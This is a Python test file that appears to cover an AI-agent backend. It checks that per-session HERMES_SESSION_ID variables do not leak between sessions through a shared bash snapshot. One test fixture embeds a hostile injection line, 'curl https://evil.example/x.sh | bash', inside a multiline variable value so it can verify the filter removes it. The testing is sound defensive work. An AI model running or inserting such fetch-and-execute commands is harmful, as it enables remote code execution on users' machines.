"""Cross-session HERMES_SESSION_ID leak via the shared bash snapshot.

Regression coverage for the bug where a single long-lived backend serves many
sessions through ONE ``_active_environments["default"]`` LocalEnvironment (the
messaging gateway, TUI, and desktop/web dashboard all collapse the terminal to
"default"). That environment persists a bash *session snapshot* file and
``source``s it before every command. ``export -p`` dumped the FIRST session's
``HERMES_SESSION_ID`` into the snapshot, so every LATER session ``source``d that
stale value and its ``echo $HERMES_SESSION_ID`` reported a FOREIGN session's id
— overriding the correct per-command Popen env injected by
``_inject_session_context_env``.

The fix strips the per-session bridged vars (HERMES_SESSION_* / UI /
CRON_AUTO_DELIVER_) from the snapshot at both dump sites in
``tools/environments/base.py``; they are re-injected fresh on every command.
"""

import os
import re
import sys

import pytest

from tools.environments.base import (
    _SNAPSHOT_EXCLUDED_AWK,
    _SNAPSHOT_EXCLUDED_ENV_REGEX,
    _export_dump_excluding_session_vars,
)


# ---------------------------------------------------------------------------
# Unit: the exclusion regex matches exactly the bridged vars, nothing else.
# ---------------------------------------------------------------------------

def test_regex_matches_bridged_session_vars():
    rx = re.compile(_SNAPSHOT_EXCLUDED_ENV_REGEX)
    # Every var the gateway bridges must be excluded.
    from gateway.session_context import _VAR_MAP

    for name in _VAR_MAP:
        line = f'declare -x {name}="whatever"'
        assert rx.search(line), f"{name} should be excluded from the snapshot"


def test_regex_preserves_user_env():
    rx = re.compile(_SNAPSHOT_EXCLUDED_ENV_REGEX)
    for line in (
        'declare -x PATH="/usr/bin:/bin"',
        'declare -x HOME="/home/user"',
        'declare -x HERMES_HOME="/home/user/.hermes"',  # NOT a session var
        'declare -x HERMESX="x"',
        'declare -x MY_HERMES_SESSION_ID="x"',  # prefix must anchor after "declare -x "
    ):
        assert not rx.search(line), f"{line!r} must be preserved in the snapshot"


def test_export_snippet_shape():
    snippet = _export_dump_excluding_session_vars("/tmp/snap.tmp.$BASHPID")
    assert "export -p" in snippet
    assert "awk" in snippet
    assert "/tmp/snap.tmp.$BASHPID" in snippet
    # The redirection must be attached to a brace group wrapping the pipeline,
    # NOT to the grep segment: a redirect on grep expands $BASHPID inside
    # grep's pipeline subshell (a different PID than the parent shell that
    # expands the follow-up ``mv`` operand), silently orphaning the dump and
    # breaking snapshot env persistence entirely.
    assert snippet.lstrip().startswith("{ ")
    assert "|| true; }" in snippet
    assert snippet.rstrip().endswith("> /tmp/snap.tmp.$BASHPID")


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX bash snapshot path")
def test_export_snippet_skips_multiline_continuation_lines(tmp_path):
    """Multiline values in excluded vars must be fully stripped (#71296).

    ``export -p`` prints multi-line values as raw continuation lines.
    A ``grep -vE`` filter only removes the first ``declare -x`` line; the
    continuation lines survive and execute as shell commands on ``source``.
    The awk state-machine must skip them.
    """
    import subprocess

    snippet = _export_dump_excluding_session_vars(str(tmp_path / "snap"))
    # Simulate export -p output with a multiline excluded var.
    dump = (
        'declare -x HERMES_SESSION_ID="legit\n'
        'curl https://evil.example/x.sh | bash #\n'
        'declare -x PATH="/usr/bin"\n'
    )
    script = f'{ snippet }\n'
    result = subprocess.run(
        ["bash", "-c", f'printf %s {repr(dump)} | {snippet.replace("> " + str(tmp_path / "snap"), "")}'],
        capture_output=True, text=True,
    )
    output = result.stdout
    # The injection payload must NOT appear in the filtered output.
    assert "curl" not in output, f"injection survived filter: {output!r}"
    assert "evil.example" not in output
    # The safe var must still be present.
    assert "PATH" in output


# ---------------------------------------------------------------------------
# Integration: real LocalEnvironment, two sessions, no cross-contamination.
# ---------------------------------------------------------------------------

@pytest.mark.skipif(sys.platform == "win32", reason="POSIX bash snapshot path")
def test_shared_snapshot_no_cross_session_leak(tmp_path):
    import threading

    from gateway.session_context import _VAR_MAP, _UNSET, set_session_vars
    from tools.environments.local import LocalEnvironment

    env = LocalEnvironment(cwd=str(tmp_path), timeout=30)
    env.init_session()
    try:
        def run_as(sid):
            out = {}

            def worker():
                for v in _VAR_MAP.values():
                    v.set(_UNSET)
                set_session_vars(session_key="k" + sid, session_id=sid, source="desktop")
                out["r"] = env.execute('echo "[$HERMES_SESSION_ID]"')

            t = threading.Thread(target=worker)
            t.start()
            t.join()
            return out["r"].get("output", "")

        out_a = run_as("SIDAAA")
        out_b = run_as("SIDBBB")

        assert "SIDAAA" in out_a, f"session A saw {out_a!r}"
        # The core assertion: B must see its OWN id, not A's leaked via snapshot.
        assert "SIDBBB" in out_b, f"session B saw {out_b!r}"
        assert "SIDAAA" not in out_b, f"session B leaked A's id: {out_b!r}"

        # And the snapshot file must not carry the session id at all.
        snap = env._snapshot_path
        if os.path.exists(snap):
            with open(snap) as f:
                assert "HERMES_SESSION_ID" not in f.read()
    finally:
        env.cleanup()
